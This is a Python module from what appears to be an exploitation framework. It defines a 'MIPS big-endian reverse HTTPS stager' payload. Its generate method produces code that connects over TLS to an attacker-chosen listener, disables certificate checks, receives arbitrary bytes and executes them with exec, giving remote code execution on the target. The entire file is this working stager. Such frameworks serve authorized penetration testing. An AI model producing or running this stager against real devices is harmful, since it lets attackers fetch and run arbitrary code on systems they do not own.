"""MIPSBE Reverse HTTPS Stager (Python)."""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "MIPSBE Reverse HTTPS",
        "description": "MIPS big-endian TLS reverse shell stager.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }
    options = {
        "LHOST": {"description": "HTTPS listener", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "HTTPS port", "required": True, "default": "443", "value": "443"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        return (
            f"import ssl,socket\n"
            f"ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n"
            f"ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE\n"
            f"with socket.create_connection(('{lhost}',{lport})) as r:\n"
            f"    with ctx.wrap_socket(r) as s:\n"
            f"        d=b''\n"
            f"        while True:\n"
            f"            c=s.recv(4096)\n"
            f"            if not c:break\n"
            f"            d+=c\n"
            f"        exec(compile(d,'<s>','exec'))\n"
        ).encode()
